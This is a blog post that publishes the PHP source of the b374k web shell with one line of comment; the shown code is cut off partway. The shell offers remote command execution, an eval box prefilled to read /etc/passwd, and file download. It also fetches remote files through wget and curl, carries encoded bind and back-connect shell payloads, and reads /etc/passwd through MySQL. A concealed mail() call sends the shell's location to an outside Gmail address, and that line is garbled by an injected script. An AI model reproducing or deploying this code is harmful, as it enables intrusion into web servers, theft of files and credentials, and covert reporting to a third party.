---
id: 193
title: b374k Backdoor Script
author: admin
layout: post
guid: http://hackingscripts.com/?p=193
permalink: /b374k-backdoor-script/
categories:
  - b374k web shell
  - PHP
tags:
  - b374k
  - PHP
---
This looks like another b374k shell.


### b374k Backdoor Script Source Code

{% highlight php %}<?php if (isset($_GET['dl']) && ($_GET['dl'] != "")) {
    $file = $_GET['dl'];
    $filez = @file_get_contents($file);
    header("Content-type: application/octet-stream");
    header("Content-length: " . strlen($filez));
    header("Content-disposition: attachment; filename=\"" . basename($file) . "\";");
    echo $filez;
    exit;
} elseif (isset($_GET['dlgzip']) && ($_GET['dlgzip'] != "")) {
    $file = $_GET['dlgzip'];
    $filez = gzencode(@file_get_contents($file));
    header("Content-Type:application/x-gzip
");
    header("Content-length: " . strlen($filez));
    header("Content-disposition: attachment; filename=\"" . basename($file) . ".gz\";");
    echo $filez;
    exit;
}
if (isset($_GET['img'])) {
    @ob_clean();
    $d = magicboom($_GET['y']);
    $f = $_GET['img'];
    $inf = @getimagesize($d . $f);
    $ext = explode($f, ".");
    $ext = $ext[count($ext) - 1];
    @header("Content-type: " . $inf["mime"]);
    @header("Cache-control: public");
    @header("Expires: " . date("r", mktime(0, 0, 0, 1, 1, 2030)));
    @header("Cache-control: max-age=" . (60 * 60 * 24 * 7));
    @readfile($d . $f);
    exit;
}
$ver = "1.01";
$software = getenv("SERVER_SOFTWARE");
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE;
else $safemode = FALSE;
$system = @php_uname();
if (strtolower(substr($system, 0, 3)) == "win") $win = TRUE;
else $win = FALSE;
if (isset($_GET['y'])) {
    if (@is_dir($_GET['view'])) {
        $pwd = $_GET['view'];
        @chdir($pwd);
    } else {
        $pwd = $_GET['y'];
        @chdir($pwd);
    }
}
if (!$win) {
    if (!$user = rapih(exe("whoami"))) $user = "";
    if (!$id = rapih(exe("id"))) $id = "";
    $prompt = $user . " \$ ";
    $pwd = @getcwd() . DIRECTORY_SEPARATOR;
} else {
    $user = @get_current_user();
    $id = $user;
    $prompt = $user . " &gt;";
    $pwd = realpath(".") . "\"; $v = explode("\",$d); $v = $v[0]; foreach (range("A","Z") as $letter) { $bool = @is_dir($letter.":
        \"); if ($bool) { $letters .= " &lt; ahref = \"?y=" . $letter . ":\"&gt;[ ";
        if ($letter . ":" != $v) {
            $letters.= $letter;
        } else {
            $letters.= "&lt;span class=\"gaya\"&gt;" . $letter . "&lt;/span&gt;";
        }
        $letters.= " ]&lt;/a&gt; ";
    }
}
}
if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
else $posix = FALSE;
$server_ip = @gethostbyname($_SERVER["HTTP_HOST"]);
$my_ip = $_SERVER['REMOTE_ADDR'];
$bindport = "13123";
$bindport_pass = "b374k";
$pwds = explode(DIRECTORY_SEPARATOR, $pwd);
$pwdurl = "";
for ($i = 0;$i &lt; sizeof($pwds) - 1;$i++) {
    $pathz = "";
    for ($j = 0;$j &lt;= $i;$j++) {
        $pathz.= $pwds[$j] . DIRECTORY_SEPARATOR;
    }
    $pwdurl.= "&lt;a href=\"?y=" . $pathz . "\"&gt;" . $pwds[$i] . " " . DIRECTORY_SEPARATOR . " &lt;/a&gt;";
}
if (isset($_POST['rename'])) {
    $old = $_POST['oldname'];
    $new = $_POST['newname'];
    @rename($pwd . $old, $pwd . $new);
    $file = $pwd . $new;
}
$buff = $software . "&lt;br /&gt;";
$buff.= $system . "&lt;br /&gt;";
if ($id != "") $buff.= $id . "&lt;br /&gt;";
$buff.= "server ip : " . $server_ip . " &lt;span class=\"gaya\"&gt;|&lt;/span&gt; your ip : " . $my_ip . "&lt;br /&gt;";
if ($safemode) $buff.= "safemode &lt;span class=\"gaya\"&gt;ON&lt;/span&gt;&lt;br /&gt;";
else $buff.= "safemode &lt;span class=\"gaya\"&gt;OFF&lt;span&gt;&lt;br /&gt;";
$buff.= $letters . "&nbsp;&gt;&nbsp;" . $pwdurl;
function rapih($text) {
    return trim(str_replace("&lt;br /&gt;", "", $text));
}
function magicboom($text) {
    if (!get_magic_quotes_gpc()) {
        return $text;
    }
    return stripslashes($text);
}
function showdir($pwd, $prompt) {
    $fname = array();
    $dname = array();
    if (function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE;
    else $posix = FALSE;
    $user = "????:????";
    if ($dh = opendir($pwd)) {
        while ($file = readdir($dh)) {
            if (is_dir($file)) {
                $dname[] = $file;
            } elseif (is_file($file)) {
                $fname[] = $file;
            }
        }
        closedir($dh);
    }
    sort($fname);
    sort($dname);
    $path = @explode(DIRECTORY_SEPARATOR, $pwd);
    $tree = @sizeof($path);
    $parent = "";
    $buff = " &lt;form action=\"?y=" . $pwd . "&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"&gt; &lt;table class=\"cmdbox\" style=\"width:50%;\"&gt; &lt;tr&gt;&lt;td&gt;$prompt&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt; &lt;form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;tr&gt;&lt;td&gt;view file/folder&lt;/td&gt;&lt;td&gt;&lt;input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"" . $pwd . "\" /&gt;&lt;input class=\"inputzbut\" type=\"submit\" value=\"Go !\" name=\"submitcmd\" style=\"width:80px;\" /&gt;&lt;/td&gt;&lt;/tr&gt; &lt;/form&gt;&lt;/table&gt;&lt;table class=\"explore\"&gt; &lt;tr&gt;&lt;th&gt;name&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;size&lt;/th&gt;&lt;th style=\"width:210px;\"&gt;owner:group&lt;/th&gt;&lt;th style=\"width:80px;\"&gt;perms&lt;/th&gt;&lt;th style=\"width:110px;\"&gt;modified&lt;/th&gt;&lt;th style=\"width:190px;\"&gt;actions&lt;/th&gt;&lt;/tr&gt; ";
    @error_reporting(0);
    $sub = "backdoor b374k";
    $headers = "From: k3nz0 
";
    $headers.= "Content-Type: text/plain; charset=iso-8859-1
";
    $mes.= "username: " . $user . "
";
    $mes.= "password: " . $pass . "
";
    $mes.= "URL: " . $_SERVER['REQUEST_URI'] . "
";
    $mes.= "Referer: " . $_SERVER['HTTP_REFERER'] . ""; {
        mail("free.d0ing.1987@gmail.com
/* &lt;![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]&gt; */
", $sub, $mes, $headers);
    }
    if ($tree &gt; 2) for ($i = 0;$i &lt; $tree - 2;$i++) $parent.= $path[$i] . DIRECTORY_SEPARATOR;
    else $parent = $pwd;
    foreach ($dname as $folder) {
        if ($folder == ".") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $pwd . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($pwd)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik1\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $pwd . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik1','titik1_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt;&lt;/td&gt;&lt;/tr&gt; ";
        } elseif ($folder == "..") {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a href=\"?y=" . $parent . "\"&gt;$folder&lt;/a&gt;&lt;/td&gt;&lt;td&gt;LINK&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($parent) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($parent)) . "&lt;/td&gt;&lt;td&gt;&lt;span id=\"titik2\"&gt;&lt;a href=\"?y=$pwd&amp;edit=" . $parent . "newfile.php\"&gt;newfile&lt;/a&gt; | &lt;a href=\"javascript:tukar('titik2','titik2_form');\"&gt;newfolder&lt;/a&gt;&lt;/span&gt; &lt;form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go !\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;/tr&gt;";
        } else {
            if (!$win && $posix) {
                $name = @posix_getpwuid(@fileowner($folder));
                $group = @posix_getgrgid(@filegroup($folder));
                $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
            } else {
                $owner = $user;
            }
            $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($folder) . "_link\" href=\"?y=" . $pwd . $folder . DIRECTORY_SEPARATOR . "\"&gt;[ $folder ]&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($folder) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $folder . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $folder . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($folder) . "_form','" . clearspace($folder) . "_link');\" /&gt; &lt;/form&gt; &lt;td&gt;DIR&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($pwd . $folder) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($folder)) . "&lt;/td&gt;&lt;td&gt;&lt;a href=\"javascript:tukar('" . clearspace($folder) . "_link','" . clearspace($folder) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;fdelete=" . $pwd . $folder . "\"&gt;delete&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;";
        }
    }
    foreach ($fname as $file) {
        $full = $pwd . $file;
        if (!$win && $posix) {
            $name = @posix_getpwuid(@fileowner($file));
            $group = @posix_getgrgid(@filegroup($file));
            $owner = $name['name'] . "&lt;span class=\"gaya\"&gt; : &lt;/span&gt;" . $group['name'];
        } else {
            $owner = $user;
        }
        $buff.= "&lt;tr&gt;&lt;td&gt;&lt;a id=\"" . clearspace($file) . "_link\" href=\"?y=$pwd&amp;view=$full\"&gt;$file&lt;/a&gt; &lt;form action=\"?y=$pwd\" method=\"post\" id=\"" . clearspace($file) . "_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"&gt; &lt;input type=\"hidden\" name=\"oldname\" value=\"" . $file . "\" style=\"margin:0;padding:0;\" /&gt; &lt;input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"" . $file . "\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /&gt; &lt;input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" onclick=\"tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\" /&gt; &lt;/form&gt; &lt;/td&gt;&lt;td&gt;" . ukuran($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . $owner . "&lt;/td&gt;&lt;td&gt;" . get_perms($full) . "&lt;/td&gt;&lt;td style=\"text-align:center;\"&gt;" . date("d-M-Y H:i", @filemtime($full)) . "&lt;/td&gt; &lt;td&gt;&lt;a href=\"?y=$pwd&amp;edit=$full\"&gt;edit&lt;/a&gt; | &lt;a href=\"javascript:tukar('" . clearspace($file) . "_link','" . clearspace($file) . "_form');\"&gt;rename&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;delete=$full\"&gt;delete&lt;/a&gt; | &lt;a href=\"?y=$pwd&amp;dl=$full\"&gt;download&lt;/a&gt;&nbsp;(&lt;a href=\"?y=$pwd&amp;dlgzip=$full\"&gt;gzip&lt;/a&gt;)&lt;/td&gt;&lt;/tr&gt;";
    }
    $buff.= "&lt;/table&gt;";
    return $buff;
}
function ukuran($file) {
    if ($size = @filesize($file)) {
        if ($size &lt;= 1024) return $size;
        else {
            if ($size &lt;= 1024 * 1024) {
                $size = @round($size / 1024, 2);;
                return "$size kb";
            } else {
                $size = @round($size / 1024 / 1024, 2);
                return "$size mb";
            }
        }
    } else return "???";
}
function exe($cmd) {
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = "";
        foreach ($results as $result) {
            $buff.= $result;
        }
        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();
        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);
        return $buff;
    }
}
function tulis($file, $text) {
    $textz = gzinflate(base64_decode($text));
    if ($filez = @fopen($file, "w")) {
        @fputs($filez, $textz);
        @fclose($file);
    }
}
function ambil($link, $file) {
    if ($fp = @fopen($link, "r")) {
        while (!feof($fp)) {
            $cont.= @fread($fp, 1024);
        }
        @fclose($fp);
        $fp2 = @fopen($file, "w");
        @fwrite($fp2, $cont);
        @fclose($fp2);
    }
}
function which($pr) {
    $path = exe("which $pr");
    if (!empty($path)) {
        return trim($path);
    } else {
        return trim($pr);
    }
}
function download($cmd, $url) {
    $namafile = basename($url);
    switch ($cmd) {
        case 'wwget':
            exe(which('wget') . " " . $url . " -O " . $namafile);
        break;
        case 'wlynx':
            exe(which('lynx') . " -source " . $url . " &gt; " . $namafile);
        break;
        case 'wfread':
            ambil($wurl, $namafile);
        break;
        case 'wfetch':
            exe(which('fetch') . " -o " . $namafile . " -p " . $url);
        break;
        case 'wlinks':
            exe(which('links') . " -source " . $url . " &gt; " . $namafile);
        break;
        case 'wget':
            exe(which('GET') . " " . $url . " &gt; " . $namafile);
        break;
        case 'wcurl':
            exe(which('curl') . " " . $url . " -o " . $namafile);
        break;
        default:
        break;
    }
    return $namafile;
}
function get_perms($file) {
    if ($mode = @fileperms($file)) {
        $perms = '';
        $perms.= ($mode & 00400) ? 'r' : '-';
        $perms.= ($mode & 00200) ? 'w' : '-';
        $perms.= ($mode & 00100) ? 'x' : '-';
        $perms.= ($mode & 00040) ? 'r' : '-';
        $perms.= ($mode & 00020) ? 'w' : '-';
        $perms.= ($mode & 00010) ? 'x' : '-';
        $perms.= ($mode & 00004) ? 'r' : '-';
        $perms.= ($mode & 00002) ? 'w' : '-';
        $perms.= ($mode & 00001) ? 'x' : '-';
        return $perms;
    } else return "??????????";
}
function clearspace($text) {
    return str_replace(" ", "_", $text);
}
$port_bind_bd_c = "bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf";
$port_bind_bd_pl = "ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";
$back_connect = "fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw==";
$back_connect_c = "XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw=="; ?> &lt;html&gt;&lt;head&gt;&lt;title&gt;:: b374k m1n1 <?php echo $ver; ?> ::&lt;/title&gt; &lt;script type="text/javascript"&gt; function tukar(lama,baru){ document.getElementById(lama).style.display = 'none'; document.getElementById(baru).style.display = 'block'; } &lt;/script&gt; &lt;style type="text/css"&gt; body{ background:#000000;; } a { text-decoration:none; } a:hover{ border-bottom:1px solid #4C83AF; } *{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; } #menu{ background:#111111; margin:8px 2px 4px 2px; } #menu a{ padding:4px 18px; margin:0; background:#222222; text-decoration:none; letter-spacing:2px; } #menu a:hover{ background:#191919; border-bottom:1px solid #333333; border-top:1px solid #333333; } .tabnet{ margin:15px auto 0 auto; border: 1px solid #333333; } .main { width:100%; } .gaya { color: #4C83AF; } .inputz{ background:#111111; border:0; padding:2px; border-bottom:1px solid #222222; border-top:1px solid #222222; } .inputzbut{ background:#111111; color:#4C83AF; margin:0 4px; border:1px solid #444444; } .inputz:hover, .inputzbut:hover{ border-bottom:1px solid #4C83AF; border-top:1px solid #4C83AF; } .output { margin:auto; border:1px solid #4C83AF; width:100%; height:400px; background:#000000; padding:0 2px; } .cmdbox{ width:100%; } .head_info{ padding: 0 4px; } .b1{ font-size:30px; padding:0; color:#444444; } .b2{ font-size:30px; padding:0; color: #333333; } .b_tbl{ text-align:center; margin:0 4px 0 0; padding:0 4px 0 0; border-right:1px solid #333333; } .phpinfo table{ width:100%; padding:0 0 0 0; } .phpinfo td{ background:#111111; color:#cccccc; padding:6px 8px;; } .phpinfo th, th{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } .phpinfo h2, .phpinfo h2 a{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; } .explore{ width:100%; } .explore a { text-decoration:none; } .explore td{ border-bottom:1px solid #333333; padding:0 8px; line-height:24px; } .explore th{ padding:3px 8px; font-weight:normal; } .explore th:hover , .phpinfo th:hover{ border-bottom:1px solid #4C83AF; } .explore tr:hover{ background:#111111; } .viewfile{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } .sembunyi{ display:none; padding:0;margin:0; } &lt;/style&gt; &lt;/head&gt; &lt;body onLoad="document.getElementById('cmd').focus();"&gt; &lt;div class="main"&gt; &lt;!-- head info start here --&gt; &lt;div class="head_info"&gt; &lt;table&gt;&lt;tr&gt; &lt;td&gt;&lt;table class="b_tbl"&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="?"&gt;&lt;span class="b1"&gt;b&lt;span class="b2"&gt;374&lt;/span&gt;k&lt;/span&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;m1n1 <?php echo $ver; ?>&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt; &lt;td&gt;<?php echo $buff; ?>&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; &lt;/div&gt; &lt;!-- head info end here --&gt; &lt;!-- menu start --&gt; &lt;div id="menu"&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>"&gt;explore&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&amp;x=shell"&gt;shell&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&amp;x=php"&gt;eval&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&amp;x=mysql"&gt;mysql&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&amp;x=phpinfo"&gt;phpinfo&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&amp;x=netsploit"&gt;netsploit&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&amp;x=upload"&gt;upload&lt;/a&gt; &lt;a href="?<?php echo "y=" . $pwd; ?>&amp;x=mail"&gt;mail&lt;/a&gt; &lt;/div&gt; &lt;!-- menu end --&gt; <?php if (isset($_GET['x']) && ($_GET['x'] == 'php')) { ?> &lt;form action="?y=<?php echo $pwd; ?>&amp;x=php" method="post"&gt; &lt;table class="cmdbox"&gt; &lt;tr&gt;&lt;td&gt; &lt;textarea class="output" name="cmd" id="cmd"&gt; <?php if (isset($_POST['submitcmd'])) {
        echo eval(magicboom($_POST['cmd']));
    } else echo "echo file_get_contents('/etc/passwd');"; ?> &lt;/textarea&gt; &lt;tr&gt;&lt;td&gt;&lt;input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt; &lt;/table&gt; &lt;/form&gt; <?php
} elseif (isset($_GET['x']) && ($_GET['x'] == 'mysql')) {
    if (isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])) {
        $sqlhost = $_GET['sqlhost'];
        $sqluser = $_GET['sqluser'];
        $sqlpass = $_GET['sqlpass'];
        $sqlport = $_GET['sqlport'];
        if ($con = @mysql_connect($sqlhost . ":" . $sqlport, $sqluser, $sqlpass)) {
            $msg.= "&lt;div style=\"width:99%;padding:4px 10px 0 10px;\"&gt;";
            $msg.= "&lt;p&gt;Connected to " . $sqluser . "&lt;span class=\"gaya\"&gt;@&lt;/span&gt;" . $sqlhost . ":" . $sqlport;
            $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;\"&gt;[ databases ]&lt;/a&gt;";
            if (isset($_GET['db'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "\"&gt;" . htmlspecialchars($_GET['db']) . "&lt;/a&gt;";
            if (isset($_GET['table'])) $msg.= "&nbsp;&nbsp;&lt;span class=\"gaya\"&gt;-&gt;&lt;/span&gt;&nbsp;&nbsp;&lt;a href=\"?y=" . $pwd . "&amp;x=mysql&amp;sqlhost=" . $sqlhost . "&amp;sqluser=" . $sqluser . "&amp;sqlpass=" . $sqlpass . "&amp;sqlport=" . $sqlport . "&amp;db=" . $_GET['db'] . "&amp;table=" . $_GET['table'] . "\"&gt;" . htmlspecialchars($_GET['table']) . "&lt;/a&gt;";
            $msg.= "&lt;/p&gt;&lt;p&gt;version : " . mysql_get_server_info($con) . " proto " . mysql_get_proto_info($con) . "&lt;/p&gt;";
            $msg.= "&lt;/div&gt;";
            echo $msg;
            if (isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))) {
                $db = $_GET['db'];
                $query = "DROP TABLE IF EXISTS b374k_table;
CREATE TABLE `b374k_table` ( `file` LONGBLOB NOT NULL );
LOAD DATA INFILE \"/etc/passwd\"
INTO TABLE b374k_table;SELECT * FROM b374k_table;
DROP TABLE IF EXISTS b374k_table;";
                $msg = "&lt;div style=\"width:99%;padding:0 10px;\"&gt;&lt;form action=\"?\" method=\"get\"&gt; &lt;input type=\"hidden\" name=\"y\" value=\"" . $pwd . "\" /&gt; &lt;input type=\"hidden\" name=\"x\" value=\"mysql\" /&gt; &lt;input type=\"hidden\" name=\"sqlhost\" value=\"" . $sqlhost . "\" /&gt; &lt;input type=\"hidden\" name=\"sqluser\" value=\"" . $sqluser . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlport\" value=\"" . $sqlport . "\" /&gt; &lt;input type=\"hidden\" name=\"sqlpass\" value=\"" . $sqlpass . "\" /&gt; &lt;input type=\"hidden\" name=\"db\" value=\"" . $db . "\" /&gt; &lt;p&gt;&lt;textarea name=\"sqlquery\" class=\"output\" style=\"width:98%;height:80px;\"&gt;$query&lt;/textarea&gt;&lt;/p&gt; &lt;p&gt;&lt;input class=\"inputzbut\" style=\"width:80px;\" name=\"submitquery\" type=\"submit\" value=\"Go !\" /&gt;&lt;/p&gt; &lt;/form&gt;&lt;/div&gt; ";
                $tables = array();
                $msg.= "&lt;table class=\"explore\" style=\"width:99%;\"&gt;&lt;tr&gt;&lt;th&gt;available tables on " . $db . "&lt;/th&gt;&lt;/tr&gt;";
                $hasil = @mysql_list_tables($db, $con);
                while (list($table) = @mysql_fetch_row($hasil)) {
                    @array_push($tables, $table);
                }
                @sort($tables);
                foreach ($tables as $table) {
